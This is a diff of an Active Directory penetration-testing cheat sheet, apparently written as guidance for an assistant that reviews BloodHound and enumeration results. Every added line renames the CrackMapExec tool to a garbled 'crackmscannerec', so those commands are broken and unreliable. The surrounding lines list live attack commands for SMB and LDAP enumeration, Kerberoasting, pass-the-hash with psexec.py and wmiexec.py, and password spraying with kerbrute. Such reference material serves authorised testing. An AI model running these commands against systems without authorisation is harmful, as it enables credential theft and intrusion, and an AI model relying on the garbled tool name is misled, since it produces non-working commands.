@@ -93,20 +93,20 @@ Analyze BloodHound output, review enumeration results, discuss methodology. No s
 **CrackMapExec / NetExec (Swiss army knife for AD):**
 ```
 # SMB enumeration
-crackmapexec smb {target} -u {user} -p {pass} --shares
-crackmapexec smb {target} -u {user} -p {pass} --users
-crackmapexec smb {target} -u {user} -p {pass} --groups
-crackmapexec smb {target} -u {user} -p {pass} --pass-pol
-crackmapexec smb {target} -u {user} -p {pass} --sessions
-crackmapexec smb {target} -u {user} -p {pass} --loggedon-users
+crackmscannerec smb {target} -u {user} -p {pass} --shares
+crackmscannerec smb {target} -u {user} -p {pass} --users
+crackmscannerec smb {target} -u {user} -p {pass} --groups
+crackmscannerec smb {target} -u {user} -p {pass} --pass-pol
+crackmscannerec smb {target} -u {user} -p {pass} --sessions
+crackmscannerec smb {target} -u {user} -p {pass} --loggedon-users
 
 # LDAP enumeration
-crackmapexec ldap {dc} -u {user} -p {pass} --users
-crackmapexec ldap {dc} -u {user} -p {pass} --groups
-crackmapexec ldap {dc} -u {user} -p {pass} --gmsa
+crackmscannerec ldap {dc} -u {user} -p {pass} --users
+crackmscannerec ldap {dc} -u {user} -p {pass} --groups
+crackmscannerec ldap {dc} -u {user} -p {pass} --gmsa
 
 # MSSQL enumeration
-crackmapexec mssql {target} -u {user} -p {pass} --local-auth
+crackmscannerec mssql {target} -u {user} -p {pass} --local-auth
 ```
 
 **ldapsearch:**
@@ -151,7 +151,7 @@ bloodhound-python -d {domain} -u {user} -p {pass} -dc {dc} -c All --zip
 GetUserSPNs.py {domain}/{user}:{pass} -dc-ip {dc} -request -outputfile kerberoast_{domain}_{timestamp}.txt
 
 # CrackMapExec
-crackmapexec ldap {dc} -u {user} -p {pass} --kerberoasting kerberoast_{timestamp}.txt
+crackmscannerec ldap {dc} -u {user} -p {pass} --kerberoasting kerberoast_{timestamp}.txt
 ```
 
 **AS-REP Roasting (T1558.004):**
@@ -199,16 +199,16 @@ psexec.py {domain}/{user}@{target} -hashes :{ntlm_hash}
 wmiexec.py {domain}/{user}@{target} -hashes :{ntlm_hash}
 
 # CrackMapExec with hash
-crackmapexec smb {target} -u {user} -H {ntlm_hash}
+crackmscannerec smb {target} -u {user} -H {ntlm_hash}
 ```
 
 **Password Spraying:**
 ```
 # Check policy first
-crackmapexec smb {dc} -u {user} -p {pass} --pass-pol
+crackmscannerec smb {dc} -u {user} -p {pass} --pass-pol
 
 # Spray (ONE password at a time)
-crackmapexec smb {dc} -u users.txt -p 'Spring2026!' --no-bruteforce --continue-on-success
+crackmscannerec smb {dc} -u users.txt -p 'Spring2026!' --no-bruteforce --continue-on-success
 
 # Kerbrute (faster, stealthier)
 kerbrute passwordspray -d {domain} --dc {dc} users.txt 'Spring2026!'
